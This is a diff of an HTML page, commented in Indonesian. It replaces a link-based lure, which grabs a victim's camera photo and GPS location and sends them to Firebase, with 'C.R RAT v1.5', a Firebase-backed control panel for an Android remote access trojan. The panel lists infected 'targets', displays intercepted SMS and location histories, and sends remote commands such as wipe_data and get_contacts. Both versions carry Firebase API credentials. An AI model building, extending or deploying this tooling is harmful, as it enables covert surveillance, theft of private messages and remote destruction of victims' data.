@@ -1,82 +1,166 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <title>P2P Share Link</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C.R RAT - Firebase Command Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #050505; color: #00ff00; font-family: 'Consolas', monospace; }
+        .terminal-border { border: 1px solid #1f2937; border-radius: 8px; background: #0a0a0a; }
+        .status-pulse { animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+    </style>
 </head>
-<body>
-  <h1>P2P Share Link</h1>
-  <button onclick="generateLink()">Generate Link</button>
-  <input id="link" type="text" readonly>
-  <div id="hasil"></div>
+<body class="p-4 md:p-8">
+    <div class="max-w-7xl mx-auto">
+        <header class="flex justify-between items-center mb-8 border-b border-green-900 pb-4">
+            <div>
+                <h1 class="text-3xl font-black text-green-500">C.R RAT v1.5 [FIREBASE]</h1>
+                <p class="text-xs text-gray-500">CONNECTED TO PROJECT: apktroj</p>
+            </div>
+            <div id="auth-status" class="text-sm text-yellow-500">Mencoba Autentikasi...</div>
+        </header>
 
-  <script src="https:                                                             
-  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
-  <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyALFQBTqWh1plqPPfO_f0ZpVGQRSbJOnu4",
-      authDomain: "selfilokasi.firebaseapp.com",
-      databaseURL: "https:                                                                 
-      projectId: "selfilokasi",
-      storageBucket: "selfilokasi.firebasestorage.app",
-      messagingSenderId: "291578424572",
-      appId: "1:291578424572:web:eba849ddabecee299cfb79",
-      measurementId: "G-PZ5WK274C9"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
-    let idLink = '';
-    const urlParams = new URLSearchParams(window.location.search);
-    const id = urlParams.get('id');
+        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
+            <!-- Target List -->
+            <div class="terminal-border p-4 col-span-1">
+                <h2 class="font-bold mb-4 uppercase text-sm tracking-widest border-b border-gray-800 pb-2">Target Online</h2>
+                <div id="target-list" class="space-y-2">
+                    <!-- Target muncul di sini secara otomatis -->
+                </div>
+            </div>
 
-    if (id) {
-                    
-      navigator.geolocation.getCurrentPosition(position => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const video = document.createElement('video');
-        navigator.mediaDevices.getUserMedia({ video: true })
-          .then(stream => {
-            video.srcObject = stream;
-            video.play();
-            setTimeout(() => {
-              const canvas = document.createElement('canvas');
-              canvas.width = 640;
-              canvas.height = 480;
-              canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-              const foto = canvas.toDataURL();
-              stream.getTracks()[0].stop();
-              db.collection('links').doc(id).update({
-                lokasi: `${lat},${lon}`,
-                foto: foto,
-                status: 'done'
-              });
-            }, 1000);
-          });
-      });
-    } else {
-                           
-      function generateLink() {
-        idLink = Math.random().toString(36).substr(2, 9);
-        const link = `${window.location.href}?id=${idLink}`;
-        document.getElementById('link').value = link;
-        db.collection('links').doc(idLink).set({
-          id: idLink,
-          status: 'pending'
+            <!-- Data Monitor -->
+            <div class="lg:col-span-3 space-y-6">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                    <!-- SMS Interceptor -->
+                    <div class="terminal-border p-4">
+                        <h3 class="font-bold mb-3 text-blue-400">SMS LOGS</h3>
+                        <div id="sms-container" class="h-64 overflow-y-auto space-y-2 text-xs font-mono">
+                            <p class="text-gray-700 italic">Menunggu data dari Firestore...</p>
+                        </div>
+                    </div>
+                    <!-- Location Tracker -->
+                    <div class="terminal-border p-4">
+                        <h3 class="font-bold mb-3 text-red-400">LOCATION HISTORY</h3>
+                        <div id="loc-container" class="h-64 overflow-y-auto space-y-2 text-xs font-mono">
+                            <p class="text-gray-700 italic">Menunggu koordinat...</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Live Command Shell -->
+                <div class="terminal-border p-6">
+                    <h3 class="font-bold mb-4 text-green-400">EXECUTE REMOTE COMMAND</h3>
+                    <div class="flex gap-2 mb-4">
+                        <input type="text" id="cmd-input" placeholder="e.g. get_contacts, wipe_data, screen_mirror" class="flex-1 bg-black border border-gray-700 p-2 text-green-500 focus:border-green-500 outline-none">
+                        <button onclick="sendCommand()" class="bg-green-600 text-black px-6 font-bold hover:bg-green-400 transition-colors">SEND</button>
+                    </div>
+                    <div id="console-output" class="bg-black p-4 h-40 overflow-y-auto text-xs border border-gray-900">
+                        <p class="text-gray-500">[SYSTEM] Terminal siap menerima perintah.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase SDKs -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, onSnapshot, addDoc, serverTimestamp, query } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        // Konfigurasi dari User
+        const firebaseConfig = {
+            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
+            authDomain: "apktroj.firebaseapp.com",
+            projectId: "apktroj",
+            storageBucket: "apktroj.firebasestorage.app",
+            messagingSenderId: "943833619122",
+            appId: "1:943833619122:web:d757ced4d56267abf247ab",
+            measurementId: "G-WR01BDY3G6"
+        };
+
+        // Inisialisasi
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+        const appId = "apktroj"; // Menyesuaikan projectId lo
+
+        // Global State
+        let currentUser = null;
+
+        // RULE 3: Auth Before Queries
+        async function initApp() {
+            try {
+                await signInAnonymously(auth);
+                console.log("Auth Success");
+            } catch (error) {
+                document.getElementById('auth-status').innerText = "Auth Failed: " + error.message;
+            }
+        }
+
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                currentUser = user;
+                document.getElementById('auth-status').innerText = "● AUTHENTICATED (ADMIN)";
+                document.getElementById('auth-status').className = "text-sm text-green-500 status-pulse";
+                startListening();
+            }
         });
 
-                                    
-        db.collection('links').doc(idLink).onSnapshot(doc => {
-          const data = doc.data();
-          if (data && data.status === 'done') {
-            document.getElementById('hasil').innerHTML = `
-              <h2>Hasil:</h2>
-              <p>Lokasi: ${data.lokasi}</p>
-              <img src="${data.foto}" width="200">
-            `;
-          }
-        });
-      }
-    }
-  </script>
+        // Start Listening to Firestore
+        function startListening() {
+            if (!currentUser) return;
+
+            // Path Publik sesuai RULE 1
+            const smsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sms_logs');
+            const locRef = collection(db, 'artifacts', appId, 'public', 'data', 'location_logs');
+            const targetsRef = collection(db, 'artifacts', appId, 'public', 'data', 'devices');
+
+            // Listen SMS
+            onSnapshot(smsRef, (snapshot) => {
+                const container = document.getElementById('sms-container');
+                container.innerHTML = "";
+                snapshot.forEach(doc => {
+                    const data = doc.data();
+                    container.innerHTML += `<div class="p-2 border-b border-gray-900"><p class="text-blue-400">[${data.sender || 'Unknown'}]</p><p>${data.body || ''}</p></div>`;
+                });
+            }, (err) => console.error("SMS Error:", err));
+
+            // Listen Devices
+            onSnapshot(targetsRef, (snapshot) => {
+                const list = document.getElementById('target-list');
+                list.innerHTML = "";
+                snapshot.forEach(doc => {
+                    const data = doc.data();
+                    list.innerHTML += `<div class="p-2 bg-green-900/10 border border-green-500/30 rounded cursor-pointer hover:bg-green-500/20">
+                        <p class="font-bold">${data.model || 'Unknown'}</p>
+                        <p class="text-[10px] text-gray-500">${doc.id}</p>
+                    </div>`;
+                });
+            });
+        }
+
+        // Send Command to Firebase
+        window.sendCommand = async () => {
+            const input = document.getElementById('cmd-input');
+            const cmd = input.value;
+            if (!cmd || !currentUser) return;
+
+            const cmdRef = collection(db, 'artifacts', appId, 'public', 'data', 'commands');
+            await addDoc(cmdRef, {
+                command: cmd,
+                target: "ALL", // Bisa di spesifikasikan nanti
+                timestamp: serverTimestamp()
+            });
+
+            document.getElementById('console-output').innerHTML += `<p class="text-yellow-500 mt-1">> Command Sent: ${cmd}</p>`;
+            input.value = "";
+        };
+
+        initApp();
+    </script>
 </body>
 </html>
